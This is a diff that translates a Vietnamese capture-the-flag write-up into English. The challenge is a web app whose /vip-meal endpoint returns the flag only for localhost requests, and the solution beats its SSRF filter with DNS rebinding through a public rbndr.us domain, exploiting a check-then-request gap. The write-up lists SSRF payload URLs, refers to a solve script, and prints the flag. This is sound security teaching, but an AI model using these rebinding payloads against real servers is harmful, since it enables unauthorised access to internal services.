@@ -9,9 +9,9 @@ pinned: false
 draft: false
 ---
 
-### Check fle source
+### Check file source
 
-Trong source có endpoint `/vip-meal`:
+The source contains a `/vip-meal` endpoint:
 
 ```python
 FLAG = open("/flag").read().strip()
@@ -25,21 +25,21 @@ def vip_meal():
     return render_template('meal.html', title="VIP Meal", message=f"Our chef cooked the beast meal for our vip customers, here is the flag {FLAG} with some caviar on top."), 200
 ```
 
-Endpoint này chỉ trả flag nếu request đến từ:
+This endpoint only returns the flag if the request comes from:
 
 ```text
 127.0.0.1
 ```
 
-Nếu truy cập trực tiếp từ bên ngoài thì bị từ chối. Vì vậy mục tiêu là dùng SSRF để bắt server tự request tới:
+If accessed directly from the outside it is denied. So the goal is to use SSRF to make the server request:
 
 ```text
 http://127.0.0.1/vip-meal
 ```
 
-### Bộ lọc SSRF
+### The SSRF filter
 
-Ứng dụng có filter chống SSRF. Trước khi fetch URL, server lấy hostname ra, resolve bằng `socket.getaddrinfo()`, rồi check IP:
+The application has an anti-SSRF filter. Before fetching a URL, the server extracts the hostname, resolves it with `socket.getaddrinfo()`, then checks the IP:
 
 ```python
 addresses = socket.getaddrinfo(urllib3.util.parse_url(url).host, 80)
@@ -53,7 +53,7 @@ for addr in addresses:
         return
 ```
 
-Do đó các payload đơn giản đều bị chặn:
+Therefore simple payloads are all blocked:
 
 ```text
 http://127.0.0.1/vip-meal
@@ -62,70 +62,70 @@ http://2130706433/vip-meal
 http://0x7f000001/vip-meal
 ```
 
-Lý do là các địa chỉ này đều resolve về IP không phải global.
+The reason is these addresses all resolve to a non-global IP.
 
-### Ý tưởng bypass
+### Bypass idea
 
-Điểm yếu nằm ở TOCTOU giữa bước check và bước request thật.
+The weakness lies in the TOCTOU between the check step and the actual request step.
 
-Server resolve hostname một lần để kiểm tra:
+The server resolves the hostname once for the check:
 
 ```text
 socket.getaddrinfo(host)
 ```
 
-Sau đó `urllib3` lại tự resolve hostname thêm lần nữa khi thực hiện request:
+Then `urllib3` resolves the hostname again when performing the request:
 
 ```python
 urllib3.request('GET', url, redirect=False, timeout=urllib3.Timeout(30))
 ```
 
-Tức là hostname được resolve ít nhất 2 lần:
+That is, the hostname is resolved at least twice:
 
 ```text
-Resolution #1: dùng để check is_global
-Resolution #2: dùng để connect thật
+Resolution #1: used for the is_global check
+Resolution #2: used for the actual connection
 ```
 
-Nếu làm DNS rebinding để lần đầu trả về IP global, filter sẽ pass. Sau đó lần request thật hoặc retry trả về `127.0.0.1`, server sẽ tự connect vào localhost và lấy được flag.
+If we use DNS rebinding so the first resolution returns a global IP, the filter passes. Then the actual request or retry returns `127.0.0.1`, and the server connects to localhost and gets the flag.
 
-### DNS rebinding với rbndr.us
+### DNS rebinding with rbndr.us
 
-Dùng domain:
+Use the domain:
 
 ```text
 7f000001.08080808.rbndr.us
 ```
 
-Trong đó:
+Where:
 
 ```text
 7f000001 = 127.0.0.1
 08080808 = 8.8.8.8
 ```
 
-Domain này sẽ random trả về một trong hai IP:
+This domain randomly returns one of the two IPs:
 
 ```text
 127.0.0.1
 8.8.8.8
 ```
 
-Payload SSRF:
+SSRF payload:
 
 ```text
 http://7f000001.08080808.rbndr.us/vip-meal
 ```
 
-Nếu lần check đầu tiên resolve ra `127.0.0.1`, request sẽ bị reject.
+If the first check resolves to `127.0.0.1`, the request is rejected.
 
-Nếu lần check đầu tiên resolve ra `8.8.8.8`, filter sẽ pass vì `8.8.8.8` là global IP. Sau đó kết nối tới `8.8.8.8:80` bị timeout. Khi `urllib3` retry, nó resolve lại domain. Nếu lần này domain trả về `127.0.0.1`, request sẽ đi tới:
+If the first check resolves to `8.8.8.8`, the filter passes because `8.8.8.8` is a global IP. Then the connection to `8.8.8.8:80` times out. When `urllib3` retries, it resolves the domain again. If this time the domain returns `127.0.0.1`, the request goes to:
 
 ```text
 http://127.0.0.1/vip-meal
 ```
 
-Khi đó `request.remote_addr == "127.0.0.1"` và endpoint `/vip-meal` trả flag.
+In that case `request.remote_addr == "127.0.0.1"` and the `/vip-meal` endpoint returns the flag.
 
 ---
 
@@ -187,16 +187,16 @@ for round in $(seq 1 20); do
 done
 ```
 
-Chạy script:
+Run the script:
 
 ```bash
 chmod +x solve.sh
 ./solve.sh
 ```
 
-### Kết quả
+### Result
 
-Một số round đầu có thể bị reject, kết quả cuối cùng:
+Some early rounds may be rejected; the final result:
 
 ```html
 {"id": "usid5g4vve", "message": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>VIP Meal</title>\n    <link rel=\"stylesheet\" href=\"/static/css/style.css\">\n</head>\n<body>\n    <header>\n        <h1>VIP Meal</h1>\n    </header>\n    <main>\n        <p>Our chef cooked the beast meal for our vip customers, here is the flag GPNCTF{whY_M4K3_It_cOmplEx_WH3n_YOU_C4N_m4KE_i7_SImpL3} with some caviar on top.</p>\n        <a href=\"/\">Back to Home</a>\n    </main>\n</body>\n</html>", "status": "DONE"}
